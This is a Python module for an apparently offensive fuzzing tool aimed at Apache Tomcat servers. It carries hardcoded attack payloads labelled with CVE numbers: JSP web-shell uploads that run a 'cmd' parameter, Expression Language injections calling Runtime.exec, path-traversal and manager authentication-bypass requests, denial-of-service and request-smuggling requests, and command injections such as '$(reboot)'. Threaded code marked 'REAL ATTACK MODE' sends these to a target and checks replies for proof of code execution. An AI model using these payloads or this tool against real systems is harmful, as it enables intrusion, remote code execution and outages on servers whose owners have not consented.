import subprocess
import random
import string
import logging
import time
import socket
import concurrent.futures

# Import DatabaseManager to check for agent logs
try:
    from ml_engine.db_manager import DatabaseManager
except ImportError:
    DatabaseManager = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Fuzzer:
    def __init__(self, target_ip=None, target_port=None):
        self.target_ip = target_ip
        self.target_port = target_port
        
        # Initialize DB Connection for Log Monitoring
        self.db = None
        if DatabaseManager:
            try:
                self.db = DatabaseManager()
                if not self.db.connected:
                    self.db = None
            except Exception as e:
                logger.warning(f"Fuzzer could not connect to DB: {e}")
        
        if self.target_ip:
            logger.info(f"Fuzzer initialized for target: {self.target_ip}:{self.target_port}")
            
        self.paths = []

    def set_paths(self, paths):
        """Sets the list of valid endpoints discovered by the Spider."""
        self.paths = paths

    NASTY_STRINGS = [
        b"%n" * 10, # Format String
        b"A" * 1024, # Buffer Overflow
        b"' OR '1'='1", # SQL Injection
        b"$(reboot)", # Command Injection
        b"../../../../etc/passwd", # Path Traversal
        b"\x00", # Null Byte Injection
        b"\xff" * 10, # Integer Overflow potential
        b"{{7*7}}", # SSTI
        b"; date;", # Command Injection (Date)
        b"| date", # Command Injection (Pipe Date)
        b"`date`", # Command Injection (Backtick Date) 
    ]

    # ============================================================
    # TOMCAT 11 CVE-SPECIFIC PAYLOADS
    # ============================================================
    
    # CVE-2025-24813: Path Traversal + Deserialization RCE (CVSS 9.1)
    # Active exploitation observed - upload malicious session via PUT
    TOMCAT_CVE_24813 = [
        b"GET /..;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /..;/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /%2e%2e;/manager/status HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /foo/..;/WEB-INF/classes/ HTTP/1.1\r\nHost: target\r\n\r\n",
        b"PUT /.session HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\nMALICIOUS!",
    ]
    
    # CVE-2024-50379 & CVE-2024-56337: TOCTOU Race Condition RCE (CVSS 9.8)
    # JSP compilation race on case-insensitive filesystem
    TOMCAT_CVE_TOCTOU = [
        b"PUT /test.Jsp HTTP/1.1\r\nHost: target\r\nContent-Length: 50\r\n\r\n<%Runtime.getRuntime().exec(\"id\");%>",
        b"PUT /test.jSp HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\n\r\n<%= new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).next() %>",
        b"PUT /shell.JSP HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\n\r\n<%@ page import=\"java.io.*\" %><%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
        b"GET /test.jsp HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    # CVE-2025-55752: Directory Traversal via Rewrite (CVSS 8.1)
    TOMCAT_CVE_55752 = [
        b"GET /rewrite/..;/WEB-INF/web.xml HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /..%252f..%252fWEB-INF/classes/ HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /foo/..;/META-INF/MANIFEST.MF HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /%c0%ae%c0%ae/WEB-INF/ HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    # CVE-2025-49125: Authentication Bypass (CVSS 8.6)
    TOMCAT_CVE_49125 = [
        b"GET /manager/..;/html HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /manager%00/html HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /;/manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /manager;foo=bar/html HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET //manager/html HTTP/1.1\r\nHost: target\r\n\r\n",
    ]
    
    # CVE-2024-54677 & CVE-2025-53506: DoS Attacks (CVSS 7.5-7.8)
    TOMCAT_CVE_DOS = [
        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 999999999\r\n\r\n",
        b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFF\r\n" + b"A" * 10000,
        b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n" * 100,
        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Type: multipart/form-data; boundary=x\r\n\r\n--x\r\n" * 1000,
    ]
    
    # EL Injection Payloads for Tomcat (CWE-917)
    TOMCAT_EL_INJECTION = [
        b"${7*7}",
        b"${T(java.lang.Runtime).getRuntime().exec('id')}",
        b"${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}",
        b"${pageContext.request.getSession().getServletContext()}",
        b"${applicationScope}",
        b"${T(java.lang.System).getenv()}",
        b"${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"id\")}",
    ]
    
    # HTTP Request Smuggling (CWE-444)
    HTTP_SMUGGLING = [
        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
        b"GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n",
        b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n",
    ]

    def mutate_payload(self, payload, mutation_rate=0.1):
        """
        Mutates the given payload (bytes).
        Uses a mix of Random Bit Flipping and Smart Injection.
        """
        if isinstance(payload, str):
            payload = payload.encode()
            
        # 30% chance to use Smart Structured Mutation (if payload is long enough)
        if len(payload) > 5 and random.random() < 0.3:
            return self.mutate_structured(payload)
            
        # Default: Random Bit Flipping
        chars = bytearray(payload)
        for i in range(len(chars)):
            if random.random() < mutation_rate:
                # Random byte
                chars[i] = random.randint(0, 255)
        return bytes(chars)

    def mutate_structured(self, payload):
        """
        Smart Mutation: Tries to preserve structure and inject nasty strings.
        """
        # Try to find delimiters
        delimiters = [b"=", b":", b" "]
        chosen_delim = None
        
        for d in delimiters:
            if d in payload:
                chosen_delim = d
                break
        
        if chosen_delim:
            parts = payload.split(chosen_delim)
            # Pick a random part to corrupt (usually the value, so index 1+)
            if len(parts) > 1:
                target_idx = random.randint(1, len(parts) - 1)
                parts[target_idx] = random.choice(self.NASTY_STRINGS)
                return chosen_delim.join(parts)
        
        # Fallback: Append or Prepend Nasty String
        if random.random() < 0.5:
            return payload + random.choice(self.NASTY_STRINGS)
        else:
            return random.choice(self.NASTY_STRINGS) + payload

    def get_tomcat_payload(self, cve_type=None):
        """
        Get a random Tomcat CVE-specific payload.
        
        Args:
            cve_type: Optional CVE type filter (24813, toctou, 55752, 49125, dos, el, smuggling)
        """
        all_tomcat_payloads = (
            self.TOMCAT_CVE_24813 + 
            self.TOMCAT_CVE_TOCTOU + 
            self.TOMCAT_CVE_55752 + 
            self.TOMCAT_CVE_49125 + 
            self.TOMCAT_CVE_DOS + 
            self.TOMCAT_EL_INJECTION + 
            self.HTTP_SMUGGLING
        )
        
        if cve_type == "24813":
            return random.choice(self.TOMCAT_CVE_24813)
        elif cve_type == "toctou":
            return random.choice(self.TOMCAT_CVE_TOCTOU)
        elif cve_type == "55752":
            return random.choice(self.TOMCAT_CVE_55752)
        elif cve_type == "49125":
            return random.choice(self.TOMCAT_CVE_49125)
        elif cve_type == "dos":
            return random.choice(self.TOMCAT_CVE_DOS)
        elif cve_type == "el":
            return random.choice(self.TOMCAT_EL_INJECTION)
        elif cve_type == "smuggling":
            return random.choice(self.HTTP_SMUGGLING)
        else:
            return random.choice(all_tomcat_payloads)

    def verify_crash(self):
        """
        Verify if crash is real vs rate-limiting.
        Wait 2s, then retry 3 times to confirm server is actually down.
        
        Returns:
            str: "CRASH_CONFIRMED", "RATE_LIMITED", or "UNKNOWN"
        """
        if not self.target_ip or not self.target_port:
            return "UNKNOWN"
        
        logger.info("Verifying crash... waiting 2s before retry")
        time.sleep(2)
        
        for attempt in range(3):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                s.close()
                logger.info(f"Server recovered on attempt {attempt + 1} - was RATE_LIMITED")
                return "RATE_LIMITED"
            except Exception:
                pass
            time.sleep(1)
        
        logger.warning("Server stayed down after 3 retries - CRASH_CONFIRMED!")
        return "CRASH_CONFIRMED"

    def check_rce_success(self, response_data):
        """
        Check if response indicates successful RCE.
        
        REAL ATTACK MODE: Comprehensive detection for Linux, Windows, Java, and Tomcat.
        
        Returns:
            tuple: (success: bool, indicator: str)
        """
        if not response_data:
            return False, None
        
        # Convert to string for pattern matching
        try:
            response_str = response_data.decode('utf-8', errors='ignore')
        except:
            response_str = str(response_data)
        
        # ============================================================
        # COMPREHENSIVE RCE INDICATORS (Real Attack Mode)
        # ============================================================
        
        # Linux RCE Indicators
        linux_indicators = [
            ("uid=", "Linux id command output"),
            ("gid=", "Linux id command output"),
            ("root:", "/etc/passwd content"),
            ("/bin/bash", "Shell path"),
            ("/bin/sh", "Shell path"),
            ("nobody:", "/etc/passwd entry"),
            ("www-data:", "Web user in /etc/passwd"),
            ("Linux version", "Kernel info"),
        ]
        
        # Windows RCE Indicators
        windows_indicators = [
            ("SYSTEM", "Windows SYSTEM user"),
            ("Administrator", "Windows Admin user"),
            ("NT AUTHORITY", "Windows NT Authority"),
            ("Windows NT", "Windows system info"),
            ("C:\\Windows", "Windows filesystem path"),
            ("C:\\Users", "Windows Users folder"),
            ("Microsoft Windows", "Windows version string"),
            ("Volume Serial Number", "Windows dir command"),
            ("Directory of", "Windows dir listing"),
            ("\\System32", "Windows System32 path"),
            ("COMPUTERNAME=", "Windows env variable"),
            ("USERDOMAIN=", "Windows domain var"),
            ("whoami", "Windows whoami output"),
            ("HOSTNAME=", "Hostname env var"),
        ]
        
        # Java/Tomcat Specific Indicators
        java_indicators = [
            ("java.lang.Runtime", "Java Runtime class"),
            ("ProcessBuilder", "Java ProcessBuilder"),
            ("catalina.home", "Tomcat home path"),
            ("java.version", "Java version property"),
            ("os.name", "Java OS name property"),
            ("user.name", "Java user name property"),
            ("CATALINA_HOME", "Tomcat env variable"),
            ("WEB-INF", "Java webapp internal folder"),
            ("web.xml", "Java webapp config"),
        ]
        
        # Command output patterns (generic)
        command_indicators = [
            ("total ", "ls -l output"),
            ("drwx", "Unix directory permissions"),
            ("-rw-", "Unix file permissions"),
        ]
        
        # Check all indicator categories
        all_indicators = linux_indicators + windows_indicators + java_indicators + command_indicators
        
        for pattern, description in all_indicators:
            if pattern in response_str:
                return True, description
        
        # Regex patterns for date/time (command execution proof)
        import re
        
        # Unix date format: "Mon Dec  8 10:30:00 UTC 2025"
        unix_date_pattern = r"[A-Z][a-z]{2} [A-Z][a-z]{2}\s+\d{1,2} \d{2}:\d{2}:\d{2}"
        if re.search(unix_date_pattern, response_str):
            return True, "Unix date command output"
        
        # Windows date format: "12/08/2025" or "08-Dec-2025"
        windows_date_pattern = r"\d{2}[/\-]\d{2}[/\-]\d{4}"
        if re.search(windows_date_pattern, response_str):
            # Check it's in a command context (not just any date in HTML)
            if "systeminfo" in response_str.lower() or "time" in response_str.lower():
                return True, "Windows date/time command output"
        
        # IP address in response (ipconfig/ifconfig output)
        ip_pattern = r"inet\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"
        if re.search(ip_pattern, response_str):
            return True, "Network interface info (ifconfig/ip)"
        
        return False, None

    def send_payload(self, payload):
        """
        Sends payload to the target via TCP socket.
        Returns dict: {"crash": bool, "data": bytes, "time_ms": float, "error_type": str}
        
        Real Attack Mode: Uses 10s timeout for complex payloads and
        differentiates between firewall blocks vs actual crashes.
        """
        result = {"crash": False, "data": None, "time_ms": 0.0, "error_type": None}
        
        if not self.target_ip or not self.target_port:
            return result

        start_time = time.time()
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10.0)  # REAL ATTACK: 10 second timeout for complex payloads
            s.connect((self.target_ip, self.target_port))
            
            # If we have discovered paths, try to inject into HTTP request line
            # This is a heuristic: if payload starts with "GET /", we replace "/" with "/path"
            final_payload = payload
            if self.paths and payload.startswith(b"GET /"):
                import random
                from urllib.parse import urlparse
                chosen_path = random.choice(self.paths)
                
                # Sanitize path: strip scheme/host, ensure leading slash
                try:
                    parsed = urlparse(chosen_path)
                    sanitized_path = parsed.path or "/"
                    if not sanitized_path.startswith("/"):
                        sanitized_path = "/" + sanitized_path
                except:
                    sanitized_path = chosen_path if chosen_path.startswith("/") else "/" + chosen_path
                
                # Replace "GET /" with "GET /path"
                # Note: This assumes standard HTTP request format
                try:
                    parts = payload.split(b" ")
                    if len(parts) >= 2:
                        parts[1] = sanitized_path.encode() if isinstance(sanitized_path, str) else sanitized_path
                        final_payload = b" ".join(parts)
                except:
                    pass
            
            s.send(final_payload)
            
            # Check for response
            try:
                data = s.recv(4096) # Read response
                s.close()
                result["data"] = data
                result["crash"] = False # Alive
            except socket.timeout:
                s.close()
                result["crash"] = False # Timeout but alive (maybe)
                
        except ConnectionRefusedError:
            # REAL ATTACK: Connection refused could be firewall OR crash
            # We mark it but verify_crash() will confirm
            result["crash"] = True
            result["error_type"] = "connection_refused"
            logger.debug("Connection refused - possible crash or firewall")
        except ConnectionResetError:
            # Connection reset usually means server crashed mid-response
            result["crash"] = True
            result["error_type"] = "connection_reset"
            logger.warning("Connection RESET - likely crash or WAF drop")
        except socket.timeout:
            # Connect timeout - server not responding (possible DoS)
            result["crash"] = False
            result["error_type"] = "timeout"
            result["time_ms"] = 10000.0  # Mark as max timeout
            logger.debug("Connection timeout - server may be overwhelmed")
        except OSError as e:
            # Network unreachable, host down, etc.
            if "Network is unreachable" in str(e) or "No route to host" in str(e):
                result["crash"] = False
                result["error_type"] = "network_unreachable"
                logger.warning(f"Network error (not a crash): {e}")
            else:
                result["crash"] = True
                result["error_type"] = "os_error"
                logger.debug(f"OS error (potential crash): {e}")
        except Exception as e:
            logger.debug(f"Socket error: {e}")
            result["error_type"] = "unknown"
            # Don't assume crash for unknown errors
            result["crash"] = False
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            
        end_time = time.time()
        if result["time_ms"] == 0.0:
            result["time_ms"] = (end_time - start_time) * 1000.0
        return result
            
    def run_fuzzing_session(self, base_payload, iterations=100):
        """
        Runs a fuzzing session against the target.
        """
        logger.info(f"Starting fuzzing session with {iterations} iterations.")
        crashes = []
        
        for i in range(iterations):
            mutated_payload = self.mutate_payload(base_payload)
            
            if self.target_ip:
                # Real Attack Mode
                result = self.send_payload(mutated_payload)
                
                # 1. Check for Hard Crash (Socket)
                if result["crash"]:
                    # Verify it's a REAL crash, not rate-limiting
                    crash_status = self.verify_crash()
                    if crash_status == "CRASH_CONFIRMED":
                        logger.warning(f"CRASH CONFIRMED at iteration {i}!")
                        crashes.append({
                            "iteration": i,
                            "payload": mutated_payload.hex(),
                            "error": "CRASH_CONFIRMED - Server stayed down",
                            "metrics": result
                        })
                        return crashes
                    else:
                        logger.info(f"Iteration {i}: Connection refused but server recovered (RATE_LIMITED)")
                        # Don't count as crash, continue fuzzing
                
                # 2. Check for Latency Spike (DoS / Heavy Processing)
                if result["time_ms"] > 1500: # > 1.5 seconds
                    logger.warning(f"Iteration {i}: High Latency ({result['time_ms']:.2f}ms) detected!")
                    crashes.append({
                        "iteration": i,
                        "payload": mutated_payload.hex(),
                        "error": f"High Latency (DoS Potential): {result['time_ms']:.2f}ms",
                        "metrics": result
                    })
                    # We don't return immediately for latency, we want to see if we can sustain it or crash it.
                    # But we mark it as a finding.
                
                # 3. Check Agent Logs (Side-Channel Feedback)
                if self.db:
                    recent_logs = self.db.get_recent_agent_logs(seconds=1)
                    for log in recent_logs:
                        content = log.get('content', '').lower()
                        if any(err in content for err in ['error', 'exception', 'panic', 'segfault', 'critical']):
                            logger.critical(f"AGENT REPORTED ERROR at iteration {i}: {content}")
                            crashes.append({
                                "iteration": i,
                                "payload": mutated_payload.hex(),
                                "error": f"Agent Logged Error: {content}",
                                "metrics": result
                            })
                            return crashes

                # 4. Analyze Response
                if result["data"]:
                    try:
                        response_str = result["data"].decode('utf-8', errors='ignore')
                        status_line = response_str.split('\r\n')[0]
                        
                        if " 500 " in status_line:
                            logger.info(f"Iteration {i}: HTTP 500 (Rejection) - Payload processed but failed.")
                        elif " 403 " in status_line:
                            logger.warning(f"Iteration {i}: HTTP 403 (Block) - WAF detected.")
                        elif " 200 " in status_line:
                            # Check for RCE confirmation in body
                            # Check for date/time patterns (e.g. "Tue Dec 3 18:00:00 UTC 2025")
                            import re
                            date_pattern = r"[A-Z][a-z]{2} [A-Z][a-z]{2} \d{1,2} \d{2}:\d{2}:\d{2}"
                            
                            if "root" in response_str or "uid=" in response_str:
                                logger.critical(f"RCE CONFIRMED! Target returned suspicious data: {response_str[:100]}")
                                crashes.append({
                                    "iteration": i,
                                    "payload": mutated_payload.hex(),
                                    "error": "RCE Confirmed (Root/UID)",
                                    "metrics": result
                                })
                                return crashes
                            elif re.search(date_pattern, response_str):
                                match = re.search(date_pattern, response_str).group(0)
                                logger.critical(f"RCE CONFIRMED! System Date/Time retrieved: {match}")
                                crashes.append({
                                    "iteration": i,
                                    "payload": mutated_payload.hex(),
                                    "error": f"RCE Confirmed (Date: {match})",
                                    "metrics": result
                                })
                                return crashes
                    except Exception as e:
                        pass # Not a valid HTTP response
            else:
                # Simulation Mode (Fallback)
                if b"AAAA" in mutated_payload and random.random() < 0.05:
                    logger.warning(f"Simulated Crash detected at iteration {i}!")
                    crashes.append({
                        "iteration": i,
                        "payload": mutated_payload.hex(),
                        "error": "Segmentation Fault (Simulated)",
                        "metrics": {"time_ms": 10}
                    })
                    
            time.sleep(0.1) # Prevent flooding
        
        return crashes

    def run_parallel_fuzzing_session(self, base_payload, iterations=100, threads=10):
        """
        Runs fuzzing in parallel threads (The Swarm).
        """
        logger.info(f"Starting PARALLEL fuzzing: {threads} threads, {iterations} total iterations.")
        
        chunk_size = max(1, iterations // threads)
        all_crashes = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for _ in range(threads):
                futures.append(executor.submit(self.run_fuzzing_session, base_payload, chunk_size))
                
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        all_crashes.extend(result)
                except Exception as e:
                    logger.error(f"Thread error: {e}")
                    
        return all_crashes

if __name__ == "__main__":
    fuzzer = Fuzzer()
    base = b"User: admin Pass: password"
    print(fuzzer.run_fuzzing_session(base, iterations=50))
